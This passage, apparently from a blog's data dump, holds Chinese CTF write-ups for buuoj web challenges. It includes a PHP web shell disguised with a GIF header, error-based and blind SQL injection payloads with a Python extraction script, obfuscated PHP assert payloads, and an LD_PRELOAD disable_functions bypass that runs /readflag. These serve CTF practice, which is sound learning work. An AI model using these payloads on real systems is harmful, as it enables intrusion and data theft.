Upload\n\n上传PHP一句话被过滤\n\n![](/pic/50.png)\n\n换成图片后缀jpg进行%00截断，还是被过滤\n\n![](/pic/51.png)\n\n尝试php2,php3,php5都被过滤\n\n![](/pic/52.png)\n\n![](/pic/53.png)\n\n![](/pic/54.png)\n\n只有phtml没有被过滤\n\n![](/pic/55.png)\n\n内容不能出现`<?`可以换成js的写法\n\n![](/pic/56.png)\n\n```\n<script language=\"php\">\neval($_POST['cmd']);\n</script>\n```\n\n再上传提示必须是图片，添加gif文件头`GIF89a`\n\n![](/pic/57.png)\n\n使用蚁剑，菜刀连接，找到flag\n\n![](/pic/58.png)\n\n### HardSQL\n\nfuzz测试\n\n`AND,BINARY,BY,CHAR,CHAR_LENGTH,CHARACTER,CHARACTER_LENGTH,CLASSIFIER,DROP,HAVING,INSERT,INTO,MODIFIES,NCHAR,NULLIF,SPECIFIC,SPECIFICTYPE,SUBSTRING,SUBSTRING_REGEX,UNION,VARBINARY,VARCHAR,+,/,!,*,||,&&,<,>,ascii,%20,%09`被过滤\n\n输入错误还会报出sql语句错误，考虑报错注入\n\n1. #### 查数据库\n\n   `?username=admin'or(updatexml(0,concat(0,(select(database())),0))%23`还是geek\n\n2. #### 查表\n\n   `?username=admin'or(updatexml(0,concat(0,(select(concat(table_name))from(information_schema.tables)where(table_schema)like('geek'))),0))%23`\n\n   H4rDsq1\n\n3. #### 查列名（应该还是只有id,usname,password）\n\n4. #### 查数据\n\n   `?username=admin'or(updatexml(0,concat(0,(select(concat(password))from(H4rDsq1))),0))%23&password=123`\n\n   `?username=admin'or(updatexml(0,concat(0,(select(reverse(password))from(H4rDsq1))),0))%23&password=123`\n   \n   因为flag超出了32个字符，floor报错注入能显示64个字符，但是by被过滤（本菜鸡找不到解决的办法）。 字符截取函数substr,mid被过滤，使用reverse函数。\n\n\n\n### FinalSQL\n\nfuzz之后发现被过滤的关键字有\n\n![](/pic/59.png)\n\n题目提示有盲注，还给了一个含有ID的界面。注入点再id处，不再是之前的输入框\n\n![](/pic/60.png)\n\n![](/pic/61.png)\n\n根据括号内的数字不同，返回的界面不同，和没被过滤的关键字可以使用盲注\n\n编写盲注脚本\n\n```\n# -*- coding: utf-8 -*-\nimport requests\n\ndef get(payload):\n    url = 'http://f408e803-8b3e-4c4e-883e-3fb61e29303f.node3.buuoj.cn/search.php?id=1=('+payload+')'\n    html = requests.get(url)\n    # print(html)\n    return html\n\ndef binsea(s_payload,len=999):\n    result = ''\n    x=1\n    while x <= len :\n        error = 0\n        left = 0\n        right = 126\n        while left <= right:\n            mid = (left + right) / 2\n            payload = \"ascii(substr((%s),%d,1))>%d\" % (s_payload,x, mid)\n\n            res = get(payload)\n            if res.status_code == 404 or res.status_code == 429:\n                x=x-1\n                error = 1\n                break\n            html=res.text\n            # print('*-*-*-*-*-*', mid)\n            if 'others' in html:\n                left = mid +1\n            else:\n                right = mid -1\n        mid = int((left + right + 1) / 2)\n        if mid == 0 :\n            break\n        if error == 0 :\n            result += chr(mid)\n            print(result)\n        x=x+1\n    return result\n\ndef get_database():\n    s_payload='database()'\n    database = binsea(s_payload)\n    print(database)\n\ndef get_tabls(db):\n    s_payload = 'select(group_concat(table_name))from(information_schema.tables)where(table_schema=\\''+db+'\\')'\n    tables=binsea(s_payload)\n\ndef get_columns(table):\n    s_payload = 'select(group_concat(column_name))from(information_schema.columns)where(table_name=\\''+table+'\\')'\n    columns=binsea(s_payload)\n\ndef get_data(columns,table):\n    s_payload='select(group_concat('+columns+'))from('+table+')'\n    password=binsea(s_payload)\n\n\n# get_database()\n\n# get_tabls('geek') #F1naI1y,Flaaaaag\n#\n# get_columns('F1naI1y') # id,username,password\n# get_columns('Flaaaaag') # id,fl4gawsl\n\n# get_data('fl4gawsl','Flaaaaag')\nget_data('id,username,password','F1naI1y')\n```\n\n跑出来有两个表F1naI1y,Flaaaaag\n\nF1naI1y表还是只有id,username,password\n\nFlaaaaag表包括id,fl4gawsl\n\n#### RCE ME\n\n打开题目有源码\n\n```\n<?php\nerror_reporting(0);\nif(isset($_GET['code'])){\n            $code=$_GET['code'];\n                    if(strlen($code)>40){  \n                                        die(\"This is too Long.\");\n                                                }\n                    if(preg_match(\"/[A-Za-z0-9]+/\",$code)){\n                                        die(\"NO.\");\n                                                }\n                    @eval($code);\n}\nelse{\n            highlight_file(__FILE__);\n}\n\n// ?>\n```\n\n 传入一个code参数，长度不能大于40，不能包含大小写字母和数字\n\n可以使用取反或者异或拼凑函数\n\n`?code=$_=(~?>);$$_{%27__%27}($$_{%27_%27});&_=phpinfo()&__=assert`\n\n\n\n**%A0%AF%B0%AC%AB**是`_GET的取反的值，$$_{%27__%27}($$_{%27_%27})`就相当于 `$_GET{'__'}($_GET{'_'}) `  联合起来就是`assert(phpinfo())`\n\n\n\n**关于assert函数**\n\nPHP 5 assert ( [mixed](https://www.php.net/manual/zh/language.pseudo-types.php#language.types.mixed) `$assertion` [, string `$description` ] ) : bool\n\nPHP 7 assert ( [mixed](https://www.php.net/manual/zh/language.pseudo-types.php#language.types.mixed) `$assertion` [, Throwable `$exception` ] ) : bool\n\n**assert()** 会检查指定的 `assertion` 并在结果为 **`FALSE`** 时采取适当的行动。\n\n如果 `assertion` 是字符串，它将会被 **assert()** 当做 PHP 代码来执行。 `assertion` 是字符串的优势是当禁用断言时它的开销会更小，并且在断言失败时消息会包含 `assertion` 表达式。 这意味着如果你传入了 boolean 的条件作为 `assertion`，这个条件将不会显示为断言函数的参数；在调用你定义的 [assert_options()](https://www.php.net/manual/zh/function.assert-options.php) 处理函数时，条件会转换为字符串，而布尔值 **`FALSE`** 会被转换成空字符串。\n\n\n\n\n\n![](/pic/64.png)\n\n先查看phpinfo()\n\n![](/pic/62.png)\n\n禁用了很多执行系统命令的函数\n\n![](/pic/63.png)\n\n```\npcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl\n```\n\n扫描当前目录 \n\npost 数据： `_=print_r(scandir(%27./%27))&__=assert`\n\n```\nArray (    [0] => .    [1] => ..    [2] => index.php )\n```\n\n扫描根目录\n\npost数据：`_=print_r(scandir(%27/%27))&__=assert`\n\n```\nArray ( [0] => . [1] => .. [2] => .dockerenv [3] => bin [4] => boot [5] => dev [6] => etc [7] => flag [8] => home [9] => lib [10] => lib64 [11] => media [12] => mnt [13] => opt [14] => proc [15] => readflag [16] => root [17] => run [18] => sbin [19] => srv [20] => sys [21] => tmp [22] => usr [23] => var ) \n```\n\n发现有一个flag文件和一个readflag文件。尝试读取内容\n\n读取flag中的文件是空的；\n\npost数据：`_=var_dump(file_get_contents(%27/flag%27))&__=assert`\n\npost数据：`_=var_dump(file_get_contents(%27/readflag%27))&__=assert`\n\n```\nstring(8856) \"ELF\u0002\u0001\u0001\u0003>\u0001�\u0006@�\u001a@8 @\u001f\u001e\u0006\u0005@@@�\u0001�\u0001\b\u0003\u00048\u00028\u00028\u0002\u001c\u001c\u0001\u0001\u0005\f \f \u0001\u0006� � � x\u0002�\u0002 \u0002\u0006� � � �\u0001�\u0001\b\u0004\u0004T\u0002T\u0002T\u0002DD\u0004P�td\u0004�\b�\b�\b<<\u0004Q�td\u0006\u0010R�td\u0004� � � (\u0002(\u0002\u0001/lib64/ld-linux-x86-64.so.2\u0004\u0010\u0001GNU\u0002\u0006 \u0004\u0014\u0003GNU�íf­CI�`[Xa\f���V�\u0001\u0001\u0001Q \u001a\u0012?\u0012m 8\u0012| � \u000b\u0012)\"\u0012\u0012!\u0012libc.so.6setuidsetegidsystemseteuid__cxa_finalizesetgid__libc_start_main_ITM_deregisterTMCloneTable__gmon_start___Jv_RegisterClasses_ITM_registerTMCloneTableGLIBC_2.2.5\u0002\u0002\u0002\u0002\u0002\u0002\u0002\u0001\u0001\u0001\u0010u\u001ai \u0002�� \b�\u0007� \b`\u0007H\u0010 \bH\u0010 �\u000f \u0006\u0001�\u000f \u0006\u0003�\u000f \u0006\u0004�\u000f \u0006\u0006�\u000f \u0006\u0007�\u000f \u0006 \u0018\u0010 \u0007\u0002 \u0010 \u0007\u0005(\u0010 \u0007\b0\u0010 \u0007 8\u0010 \u0007\u000bH��\bH�\u0005� H��t\u0002��H��\b��5� �%� \u000f\u001f@�%� h������%� h\u0001������%� h\u0002������%� h\u0003�����%� h\u0004�����%b f�1�I��^H��H���PTL�\u0005�\u0001H� s\u0001H�=\f\u0001�\u0015\u000e �\u000f\u001fDH�=y H�\u0005y UH)�H��H��\u000ev\u0015H�\u0005�\b H��t ]��f\u000f\u001fD]�\u000f\u001f@f.\u000f\u001f�H�=9 H�52 UH)�H��H��\u0003H��H��?H\u0001�H��t\u0018H�\u0005�\b H��t\f]��f\u000f\u001f�]�\u000f\u001f@f.\u000f\u001f��=�\b u'H�=�\b UH��t\fH�=�\b � ����H���]�\u0005�\b \u0001��\u000f\u001f@f.\u000f\u001f�H�=A\u0006 H�?u\u000b�^���f\u000f\u001fDH�\u0005)\b H��t�UH����]�@���UH����������~������_������@���H�=���\u001f����]�f.\u000f\u001f�f�AWAVA��AUATL�%�\u0005 UH�-�\u0005 SI��I��L)�H��\bH��\u0003����H��t 1�\u000f\u001f�L��L��D��A�\u0014�H��\u0001H9�u�H��\b[]A\\A]A^A_Ðf.\u000f\u001f���H��\bH��\b�\u0001\u0002/bin/cat /flag\u0001\u001b\u0003;8\u0006l�������������T\f����l��������,\u0001\u0014\u0001zR\u0001x\u0010\u0001\u001b\f\u0007\b�\u0001\u0007\u0010\u0014\u001c����+\u0014\u0001zR\u0001x\u0010\u0001\u001b\f\u0007\b�\u0001$\u001c����`\u000e\u0010F\u000e\u0018J\u000f\u000bw\b�?\u001a;*3$\"\u0014D\u0018���\b\u001c\\@���TA\u000e\u0010�\u0002C \u0006\u0002O\f\u0007\bD|����eB\u000e\u0010�\u0002B\u000e\u0018�\u0003E\u000e �\u0004B\u000e(�\u0005H\u000e0�\u0006H\u000e8�\u0007M\u000e@r\u000e8A\u000e0A\u000e(B\u000e B\u000e\u0018B\u000e\u0010B\u000e\b\u0014�����\u0002�\u0007`\u0007\u0001\u0001\f\u0018\u0006 �\b\u0019� \u001b\b\u001a� \u001c\b���o�\u0002\u0005�\u0003\u0006�\u0002 �\u000b\u0018\u0015\u0003\u0010 \u0002x\u0014\u0007\u0017�\u0005\u0007�\u0004\b� \u0018���o\b���o�\u0004���o\u0001���o�\u0004���o\u0003� F\u0006V\u0006f\u0006v\u0006�\u0006H\u0010 GCC: (Debian 6.3.0-18+deb9u1) 6.3.0 20170516\u0003\u00018\u0002\u0003\u0002T\u0002\u0003\u0003t\u0002\u0003\u0004�\u0002\u0003\u0005�\u0002\u0003\u0006�\u0003\u0003\u0007�\u0004\u0003\b�\u0004\u0003 �\u0004\u0003 �\u0005\u0003\u000b\u0018\u0006\u0003\f0\u0006\u0003 �\u0006\u0003\u000e�\u0006\u0003\u000f�\b\u0003\u0010�\b\u0003\u0011�\b\u0003\u0012 \u0003\u0013� \u0003\u0014� \u0003\u0015� \u0003\u0016� \u0003\u0017�\u000f \u0003\u0018\u0010 \u0003\u0019@\u0010 \u0003\u001aP\u0010 \u0003\u001b\u0001\u0004��\f\u0001\u0015� \u0019\u0002\u000e�\u0006\u001b\u0002\u000e\u0010\u0007.\u0002\u000e`\u0007D\u0001\u001aP\u0010 \u0001S\u0001\u0014� z\u0002\u000e�\u0007�\u0001\u0013� �\u0004��\u0001\u0004���\u0001\u0012\b �\u0001\u0015� \u0004���\u0013� �\u0001\u0016� �\u0013� �\u0011�\b \u0001\u0001\u0018\u0010 \u0001\u0012\u000e�\b\u00020\u0001 �\u0001 \u0019@\u0010 L\u0001\u0010\u0019P\u0010 *\u0001\u0012\u000f�\bS\u0001\u0012g\u0001\u0012�\u0001\u0010\u0019@\u0010 �\u0001 �\u0001\u0011\u0002\u0019H\u0010 �\u0001\u0011\u0010�\b\u0004�\u0001\u0012\u000e0\be�\u0010\u001aX\u0010 �\u0001\u0012\u000e�\u0006+�\u0001\u0010\u001aP\u0010 �\u0001\u0012\u000e�\u0007T�\u0001\u0012�\u0001 \u0007\u0002\u0011\u0002\u0019P\u0010 \u0013\u0002 -\u0002\u0012A\u0002\"�\u0001\u0012\u000b\u0018\u0006]\u0002\u0012r\u0002\u0012crtstuff.c__JCR_LIST__deregister_tm_clones__do_global_dtors_auxcompleted.6972__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entryreadflag.c__FRAME_END____JCR_END____init_array_end_DYNAMIC__init_array_start__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_csu_fini_ITM_deregisterTMCloneTable_edatasystem@@GLIBC_2.2.5__libc_start_main@@GLIBC_2.2.5__data_start__gmon_start____dso_handle_IO_stdin_used__libc_csu_init__bss_startmainsetgid@@GLIBC_2.2.5_Jv_RegisterClasses__TMC_END___ITM_registerTMCloneTablesetuid@@GLIBC_2.2.5__cxa_finalize@@GLIBC_2.2.5setegid@@GLIBC_2.2.5seteuid@@GLIBC_2.2.5.symtab.strtab.shstrtab.interp.note.ABI-tag.note.gnu.build-id.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.plt.got.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.jcr.dynamic.got.plt.data.bss.comment\u001b\u0001\u00028\u00028\u0002\u001c\u0001#\u0007\u0002T\u0002T\u0002 \u00041\u0007\u0002t\u0002t\u0002$\u0004D���o\u0002�\u0002�\u0002\u001c\u0005\bN\u000b\u0002�\u0002�\u0002 \u0001\u0006\u0001\b\u0018V\u0003\u0002�\u0003�\u0003�\u0001^���o\u0002�\u0004�\u0004\u0018\u0005\u0002\u0002k���o\u0002�\u0004�\u0004 \u0006\u0001\bz\u0004\u0002�\u0004�\u0004�\u0005\b\u0018�\u0004B�\u0005�\u0005x\u0005\u0018\b\u0018�\u0001\u0006\u0018\u0006\u0018\u0006\u0017\u0004�\u0001\u00060\u00060\u0006`\u0010\u0010�\u0001\u0006�\u0006�\u0006\b\b�\u0001\u0006�\u0006�\u0006\u0002\u0002\u0010�\u0001\u0006�\b�\b \u0004�\u0001\u0002�\b�\b\u0013\u0004�\u0001\u0002�\b�\b<\u0004�\u0001\u0002 \f\u0001\b�\u000e\u0003� � \b\b\b�\u000f\u0003� � \b\b\b�\u0001\u0003� � \b\b�\u0006\u0003� � �\u0001\u0006\b\u0010�\u0001\u0003�\u000f �\u000f0\b\b�\u0001\u0003\u0010 \u0010@\b\b�\u0001\u0003@\u0010 @\u0010\u0010\b�\b\u0003P\u0010 P\u0010\b\u0001\u0003\u0001\u00010P\u0010-\u0001\u0001\u0001\u0002�\u0010�\u0006\u001d/\b\u0018 \u0003@\u0017�\u0002\u0001\u0011\u0003�\u0019\f\u0001\u0001\" \n```\n\n是linux可执文件\n\n连接蚁剑 payload :`?code=$_=(~%A0%B8%BA%AB);$$_{%27__%27}($$_{%27_%27});&__=assert&_=eval($_POST['cmd'])`\n\n应该是要绕过disable_function,从而执行readflag，项目地址\n\n```\nhttps://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD\n```\n\n只有/tmp有文件修改权限，上传`bypass_disablefunc.php、bypass_disablefunc_x64.so、bypass_disablefunc_x86.so`到/tmp下\n\n最后payload:\n\n`?code=$_=(~%A0%B8%BA%AB);$$_{%27__%27}($$_{%27_%27});&__=assert&_=include \"/tmp/bypass_disablefunc.php\"&cmd=/readflag&outpath=/tmp/xx&sopath=/tmp/bypass_disablefunc_x64.so`\n\n输出为\n\n```\n example: http://site.com/bypass_disablefunc.php?cmd=pwd&outpath=/tmp/xx&sopath=/var/www/bypass_disablefunc_x64.so\n\ncmdline: /readflag > /tmp/xx 2>&1\n\noutput:\nflag{6e16639a-9eca-45b8-a972-e61da4146393}\n```\n\n","slug":"buuoj刷题记录10-极客大挑战web2","published":1,"updated":"2020-02-04T15:42:06.357Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck6ah3a8a00005k7eaksp6yn6"},{"title":"buuoj刷题记录11-SUCTF复现","date":"2020-02-04T15:46:53.000Z","_content":"\n## Pythonginx\n\n题目给了源码\n\n```\n@app.route('/getUrl', methods=['GET', 'POST'])\ndef getUrl():\n    url = request.args.get(\"url\")\n    host = parse.urlparse(url).hostname\n    if host == 'suctf.cc':\n        return \"我扌 your problem? 111\"\n    parts = list(urlsplit(url))\n    host = parts[1]\n    if host == 'suctf.cc':\n        return \"我扌 your problem? 222 \" + host\n    newhost = []\n    for h in host.split('.'):\n        newhost.append(h.encode('idna').decode('utf-8'))\n    parts[1] = '.'.join(newhost)\n    #去掉 url 中的空格\n    finalUrl = urlunsplit(parts).split(' ')[0]\n    host = parse.urlparse(finalUrl).hostname\n    if host == 'suctf.cc':\n        return urllib.request.urlopen(finalUrl).read()\n    else:\n        return \"我扌 your problem? 333\"\n```\n\nparse.urlparse()函数：\n\n将URL解析为六个组件，返回一个6个元素的元组，对应URL的一般结构：`scheme://netloc/path;parameters?query#fragment`\n\n\n\n","source":"_posts/buuoj刷题记录11.md","raw":"---\ntitle: buuoj刷题记录11-SUCTF复现\ndate: 2020-02-04 23:46:53\ntags:\n - buuoj\n - web\n - suctf2019\n---\n\n## Pythonginx\n\n题目给了源码\n\n```\n@app.route('/getUrl', methods=['GET', 'POST'])\ndef getUrl():\n    url = request.args.get(\"url\")\n    host = parse.urlparse(url).hostname\n    if host == 'suctf.cc':\n        return \"我扌 your problem? 111\"\n    parts = list(urlsplit(url))\n    host = parts[1]\n    if host == 'suctf.cc':\n        return \"我扌 your problem? 222 \" + host\n    newhost = []\n    for h in host.split('.'):\n        newhost.append(h.encode('idna').decode('utf-8'))\n    parts[1] = '.'.join(newhost)\n    #去掉 url 中的空格\n    finalUrl = urlunsplit(parts).split(' ')[0]\n    host = parse.urlparse(finalUrl).hostname\n    if host == 'suctf.cc':\n        return urllib.request.urlopen(finalUrl).read()\n    else:\n        return \"我扌 your problem? 333\"\n```\n\nparse.urlparse()函数：\n\n将URL解析为六个组件，返回一个6个元素的元组，对应URL的一般结构：`scheme://netloc/path;parameters?query#fragment`\n\n\n\n","slug":"buuoj刷题记录11","published":1,"updated":"2020-02-04T16:55:29.845Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck6ah3a8g00015k7ee0jhfcnz"}],"PostAsset":[],"PostCategory":[],"PostTag":[{"post_id":"ck4pc9e4m0001187efvop7z5v","tag_id":"ck4pc9e4s0004187e0inveyny","_id":"ck4pc9e54000b187eeg669m47"},{"post_id":"ck4pc9e4m0001187efvop7z5v","tag_id":"ck4pc9e500008187ec9fi3erm","_id":"ck4pc9e55000e187e7cka5d18"},{"post_id":"ck4pc9e4m0001187efvop7z5v","tag_id":"ck4pc9e520009187ef33hfrxm","_id":"ck4pc9e55000f187ecurch409"},{"post_id":"ck4pc9e4q0003187eglmn5tk2","tag_id":"ck4pc9e4s0004187e0inveyny","_id":"ck4pc9e57000j187e3x7rd3mw"},{"post_id":"ck4pc9e4q0003187eglmn5tk2","tag_id":"ck4pc9e54000d187e4zn56trk","_id":"ck4pc9e57000k187e1cv97jbd"},{"post_id":"ck4pc9e4q0003187eglmn5tk2","tag_id":"ck4pc9e500008187ec9fi3erm","_id":"ck4pc9e58000m187edsfcaj68"},{"post_id":"ck4pc9e4q0003187eglmn5tk2","tag_id":"ck4pc9e4z0007187ehnnq07s7","_id":"ck4pc9e59000n187egoxygbo6"},{"post_id":"ck4pc9e4v0005187eb7yv5rj5","tag_id":"ck4pc9e56000i187e4e8ib1ko","_id":"ck4pc9e5a000q187ee189fhfo"},{"post_id":"ck4pc9e4v0005187eb7yv5rj5","tag_id":"ck4pc9e500008187ec9fi3erm","_id":"ck4pc9e5b000r187e84whc3pe"},{"post_id":"ck4pc9e4v0005187eb7yv5rj5","tag_id":"ck4pc9e4s0004187e0inveyny","_id":"ck4pc9e5b000s187e7odk0o42"},{"post_id":"ck4pc9e4v0005187eb7yv5rj5","tag_id":"ck4pc9e5a000p187ebctdgelf","_id":"ck4pc9e5b000t187e2lnb7b7v"},{"post_id":"ck4s68np80000t47e7n0scb9i","tag_id":"ck4pc9e500008187ec9fi3erm","_id":"ck4s68npz0002t47e4g321bt1"},{"post_id":"ck4s68np80000t47e7n0scb9i","tag_id":"ck4pc9e4s0004187e0inveyny","_id":"ck4s68npz0003t47ehe6q1kar"},{"post_id":"ck4s68np80000t47e7n0scb9i","tag_id":"ck4pc9e5a000p187ebctdgelf","_id":"ck4s68nq00004t47e9tc5c5he"},{"post_id":"ck4s68np80000t47e7n0scb9i","tag_id":"ck4s68npk0001t47edky04y7k","_id":"ck4s68nq00005t47e0ldre2b2"},{"post_id":"ck4pc9e4m0001187efvop7z5v","tag_id":"ck4pc9e5a000p187ebctdgelf","_id":"ck4s68nrd0006t47eh2lo3t4e"},{"post_id":"ck4wcegh50000yo7e74w97qcq","tag_id":"ck4wceghc0001yo7eav4zhw8a","_id":"ck4wceghk0002yo7eam2xf9xl"},{"post_id":"ck4wcegh50000yo7e74w97qcq","tag_id":"ck4pc9e5a000p187ebctdgelf","_id":"ck4wceghl0003yo7e8y5h1fpz"},{"post_id":"ck4wcegh50000yo7e74w97qcq","tag_id":"ck4pc9e500008187ec9fi3erm","_id":"ck4wceghl0004yo7e1yp1eqao"},{"post_id":"ck4wg88at0000yk7eghziaddi","tag_id":"ck4wg88b40002yk7ec8s1feoz","_id":"ck4wg88bk0004yk7e91im0wpb"},{"post_id":"ck4wg88at0000yk7eghziaddi","tag_id":"ck4pc9e4s0004187e0inveyny","_id":"ck4wg88bk0005yk7efuk5aevf"},{"post_id":"ck4wg88at0000yk7eghziaddi","tag_id":"ck4wg88bj0003yk7eakalb4dz","_id":"ck4wg88bl0006yk7e1ilzguhg"},{"post_id":"ck6ah3a8a00005k7eaksp6yn6","tag_id":"ck4pc9e4s0004187e0inveyny","_id":"ck6ah3a8u00045k7ecty4efq2"},{"post_id":"ck6ah3a8a00005k7eaksp6yn6","tag_id":"ck6ah3a8j00025k7e5a9d30x8","_id":"ck6ah3a8u00055k7ebgpnf1ml"},{"post_id":"ck6ah3a8a00005k7eaksp6yn6","tag_id":"ck4pc9e500008187ec9fi3erm","_id":"ck6ah3a8u00065k7e70gea5zn"},{"post_id":"ck6ah3a8g00015k7ee0jhfcnz","tag_id":"ck4pc9e4z0007187ehnnq07s7","_id":"ck6ah3a8u00075k7ea5tvb1sa"},{"post_id":"ck6ah3a8g00015k7ee0jhfcnz","tag_id":"ck4pc9e500008187ec9fi3erm","_id":"ck6ah3a8v00085k7e2o4jdj0h"},{"post_id":"ck6ah3a8g00015k7ee0jhfcnz","tag_id":"ck6ah3a8t00035k7e61gz0a9t","_id":"ck6ah3a8v00095k7e1iio6zvn"}],"Tag":[{"name":"ctf","_id":"ck4pc9e4s0004187e0inveyny"},{"name":"buuoj","_id":"ck4pc9e4z0007187ehnnq07s7"},{"name":"web","_id":"ck4pc9e500008187ec9fi3erm"},{"name":"0CTF","_id":"ck4pc9e520009187ef33hfrxm"},{"name":"Roarctf","_id":"ck4pc9e54000d187e4zn56trk"},{"name":"ciscn","_id":"ck4pc9e56000i187e4e8ib1ko"},{"name":"buuctf","_id":"ck4pc9e5a000p187ebctdgelf"},{"name":"De1CTF","_id":"ck4s68npk0001t47edky04y7k"},{"name":"网鼎杯2018","_id":"ck4wceghc0001yo7eav4zhw8a"},{"name":"安恒月赛2020","_id":"ck4wg88b40002yk7ec8s1feoz"},{"name":"wp","_id":"ck4wg88bj0003yk7eakalb4dz"},{"name":"极客大挑战","_id":"ck6ah3a8j00025k7e5a9d30x8"},{"name":"suctf2019","_id":"ck6ah3a8t00035k7e61gz0a9t"}]}}